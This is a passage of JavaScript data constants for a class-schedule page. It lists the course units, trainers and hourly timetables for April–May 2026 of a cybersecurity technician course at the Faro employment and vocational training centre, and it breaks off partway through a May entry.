        // ── DATA ────────────────────────────────────────────────────────
        const BUILD_TS    = '1790337050';
        const UC_MAP      = {"FPCT": {"descricao": "Formação em Contexto de Trabalho", "formador": "", "carga_horaria": 500, "modalidade": ""}, "UC00034": {"descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros", "carga_horaria": 50, "modalidade": ""}, "UC00245": {"descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro", "carga_horaria": 25, "modalidade": ""}, "UC00598": {"descricao": "Efetuar Operações e Cálculos Matemáticos Aplicados a Projetos da Área de Informática", "formador": "Jose Gabriel Fernandes Chaveca", "carga_horaria": 50, "modalidade": ""}, "UC00599": {"descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira", "carga_horaria": 50, "modalidade": ""}, "UC00602": {"descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho", "carga_horaria": 25, "modalidade": "remoto"}, "UC00606": {"descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro", "carga_horaria": 50, "modalidade": ""}, "UC00616": {"descricao": "Implementar as Normas de Segurança e Saúde no Trabalho no Setor de Informática", "formador": "Cláudia Marisa Canhoto Da Silva", "carga_horaria": 25, "modalidade": "remoto"}, "UC00631": {"descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves", "carga_horaria": 50, "modalidade": "remoto"}, "UC00633": {"descricao": "Instalar e Parametrizar Sistemas Operativos de Servidor (Plataforma Proprietária)", "formador": "Ivan Filipe Saloio Gonçalves", "carga_horaria": 50, "modalidade": "remoto"}, "UC00634": {"descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves", "carga_horaria": 25, "modalidade": "remoto"}, "UC00635": {"descricao": "Configurar Serviços de Rede", "formador": "Ivan Filipe Saloio Gonçalves", "carga_horaria": 25, "modalidade": "remoto"}, "UC01476": {"descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta", "carga_horaria": 25, "modalidade": ""}, "UC01477": {"descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca", "carga_horaria": 50, "modalidade": ""}, "UC01478": {"descricao": "Configurar Redes de Computadores", "formador": "Iolanda Aquino Serro", "carga_horaria": 25, "modalidade": ""}, "UC01479": {"descricao": "Implementar Mecanismos de Proteção Contra Ameaças Cibernéticas", "formador": "Manuel Domingos Vasconcelos Moreira", "carga_horaria": 25, "modalidade": "remoto"}, "UC01480": {"descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho", "carga_horaria": 50, "modalidade": "remoto"}, "UC01481": {"descricao": "Desenvolver Scripts Aplicados à Cibersegurança", "formador": "Iolanda Aquino Serro", "carga_horaria": 25, "modalidade": ""}, "UC01482": {"descricao": "Programar Scripts de Normalização e Filtragem de Logs", "formador": "Iolanda Aquino Serro", "carga_horaria": 50, "modalidade": ""}, "UC01483": {"descricao": "Detetar e Analisar Vulnerabilidades em Soluções Web", "formador": "", "carga_horaria": 50, "modalidade": ""}, "UC01484": {"descricao": "Detetar e Analisar Vulnerabilidades em Sistemas de Rede", "formador": "", "carga_horaria": 50, "modalidade": ""}, "UC01485": {"descricao": "Instalar e Configurar Ferramentas de Análise e Recolha de Logs e Evidências", "formador": "", "carga_horaria": 50, "modalidade": ""}, "UC01486": {"descricao": "Gerir Sistemas de Deteção de Intrusos (IDS)", "formador": "", "carga_horaria": 50, "modalidade": ""}, "UC01487": {"descricao": "Simular Cenários de Cibersegurança e Ciberdefesa (Wargamming)", "formador": "Ivan Filipe Saloio Gonçalves", "carga_horaria": 50, "modalidade": "remoto"}, "UC01489": {"descricao": "Implementar Procedimentos de Recolha e Análise Forense Digital", "formador": "Paulo José Santos Vaz", "carga_horaria": 50, "modalidade": "remoto"}, "UC01491": {"descricao": "Projetar e Administrar Sistemas de Bases de Dados", "formador": "Paulo Ricardo Costa Ramalho", "carga_horaria": 50, "modalidade": "remoto"}};
        const UC_LIST     = [{"codigo": "FPCT", "descricao": "Formação em Contexto de Trabalho", "formador": "", "carga_horaria": 500, "modalidade": ""}, {"codigo": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros", "carga_horaria": 50, "modalidade": ""}, {"codigo": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro", "carga_horaria": 25, "modalidade": ""}, {"codigo": "UC00598", "descricao": "Efetuar Operações e Cálculos Matemáticos Aplicados a Projetos da Área de Informática", "formador": "Jose Gabriel Fernandes Chaveca", "carga_horaria": 50, "modalidade": ""}, {"codigo": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira", "carga_horaria": 50, "modalidade": ""}, {"codigo": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho", "carga_horaria": 25, "modalidade": "remoto"}, {"codigo": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro", "carga_horaria": 50, "modalidade": ""}, {"codigo": "UC00616", "descricao": "Implementar as Normas de Segurança e Saúde no Trabalho no Setor de Informática", "formador": "Cláudia Marisa Canhoto Da Silva", "carga_horaria": 25, "modalidade": "remoto"}, {"codigo": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves", "carga_horaria": 50, "modalidade": "remoto"}, {"codigo": "UC00633", "descricao": "Instalar e Parametrizar Sistemas Operativos de Servidor (Plataforma Proprietária)", "formador": "Ivan Filipe Saloio Gonçalves", "carga_horaria": 50, "modalidade": "remoto"}, {"codigo": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves", "carga_horaria": 25, "modalidade": "remoto"}, {"codigo": "UC00635", "descricao": "Configurar Serviços de Rede", "formador": "Ivan Filipe Saloio Gonçalves", "carga_horaria": 25, "modalidade": "remoto"}, {"codigo": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta", "carga_horaria": 25, "modalidade": ""}, {"codigo": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca", "carga_horaria": 50, "modalidade": ""}, {"codigo": "UC01478", "descricao": "Configurar Redes de Computadores", "formador": "Iolanda Aquino Serro", "carga_horaria": 25, "modalidade": ""}, {"codigo": "UC01479", "descricao": "Implementar Mecanismos de Proteção Contra Ameaças Cibernéticas", "formador": "Manuel Domingos Vasconcelos Moreira", "carga_horaria": 25, "modalidade": "remoto"}, {"codigo": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho", "carga_horaria": 50, "modalidade": "remoto"}, {"codigo": "UC01481", "descricao": "Desenvolver Scripts Aplicados à Cibersegurança", "formador": "Iolanda Aquino Serro", "carga_horaria": 25, "modalidade": ""}, {"codigo": "UC01482", "descricao": "Programar Scripts de Normalização e Filtragem de Logs", "formador": "Iolanda Aquino Serro", "carga_horaria": 50, "modalidade": ""}, {"codigo": "UC01483", "descricao": "Detetar e Analisar Vulnerabilidades em Soluções Web", "formador": "", "carga_horaria": 50, "modalidade": ""}, {"codigo": "UC01484", "descricao": "Detetar e Analisar Vulnerabilidades em Sistemas de Rede", "formador": "", "carga_horaria": 50, "modalidade": ""}, {"codigo": "UC01485", "descricao": "Instalar e Configurar Ferramentas de Análise e Recolha de Logs e Evidências", "formador": "", "carga_horaria": 50, "modalidade": ""}, {"codigo": "UC01486", "descricao": "Gerir Sistemas de Deteção de Intrusos (IDS)", "formador": "", "carga_horaria": 50, "modalidade": ""}, {"codigo": "UC01487", "descricao": "Simular Cenários de Cibersegurança e Ciberdefesa (Wargamming)", "formador": "Ivan Filipe Saloio Gonçalves", "carga_horaria": 50, "modalidade": "remoto"}, {"codigo": "UC01489", "descricao": "Implementar Procedimentos de Recolha e Análise Forense Digital", "formador": "Paulo José Santos Vaz", "carga_horaria": 50, "modalidade": "remoto"}, {"codigo": "UC01491", "descricao": "Projetar e Administrar Sistemas de Bases de Dados", "formador": "Paulo Ricardo Costa Ramalho", "carga_horaria": 50, "modalidade": "remoto"}];
        const HORARIOS    = [{"instituicao": "Centro de Emprego e Formação Profissional de Faro", "modalidade": "Cursos de Especialização Tecnológica - CET", "designacao": "Técnico/a Especialista em Cibersegurança", "codigo_financeiro": "481110E0007", "codigo_administrativo": "11650885", "nivel": 5, "mes_ano": "abril 2026", "horario_diario": "09:00-17:00", "dias": [{"data": "2026-04-09", "dia_semana": "QUI", "aulas": [{"hora": "14:00-15:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "15:00-16:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "16:00-17:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}]}, {"data": "2026-04-10", "dia_semana": "SEX", "aulas": [{"hora": "14:00-15:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-04-13", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "10:00-11:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "11:00-12:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "12:00-13:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "14:00-15:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-04-14", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-04-16", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "10:00-11:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "11:00-12:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "12:00-13:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "14:00-15:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-04-17", "dia_semana": "SEX", "aulas": [{"hora": "14:00-15:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-04-20", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "10:00-11:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "11:00-12:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "12:00-13:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "14:00-15:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-04-21", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": ""}, {"hora": "10:00-11:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": ""}, {"hora": "11:00-12:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": ""}, {"hora": "12:00-13:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": ""}, {"hora": "14:00-15:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-04-22", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}]}, {"data": "2026-04-23", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}]}, {"data": "2026-04-24", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-04-27", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "10:00-11:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "11:00-12:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "12:00-13:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "14:00-15:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "15:00-16:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "16:00-17:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}]}, {"data": "2026-04-28", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": ""}, {"hora": "10:00-11:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": ""}, {"hora": "11:00-12:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": ""}, {"hora": "12:00-13:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": ""}, {"hora": "14:00-15:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-04-29", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-04-30", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}]}]}, {"instituicao": "Centro de Emprego e Formação Profissional de Faro", "modalidade": "Cursos de Especialização Tecnológica - CET", "designacao": "Técnico/a Especialista em Cibersegurança", "codigo_financeiro": "481110E0007", "codigo_administrativo": "11650885", "nivel": 5, "mes_ano": "maio 2026", "horario_diario": "09:00-17:00", "dias": [{"data": "2026-05-01", "dia_semana": "SEX", "aulas": [], "nota": "Feriado - Dia do Trabalhador"}, {"data": "2026-05-04", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "10:00-11:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "11:00-12:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "12:00-13:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "14:00-15:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "15:00-16:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "16:00-17:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}]}, {"data": "2026-05-05", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "10:00-11:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "11:00-12:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "12:00-13:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "14:00-15:00", "uc": "UC00602", "descricao": "Modelar Bases de Dados Relacionais", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-05-06", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-05-07", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "10:00-11:00", "uc": "UC00245", "descricao": "Desenvolver Algoritmos", "formador": "Iolanda Aquino Serro"}, {"hora": "11:00-12:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "12:00-13:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "14:00-15:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-05-08", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-05-11", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "10:00-11:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "11:00-12:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "12:00-13:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "14:00-15:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "15:00-16:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "16:00-17:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}]}, {"data": "2026-05-12", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "10:00-11:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "11:00-12:00", "uc": "UC00599", "descricao": 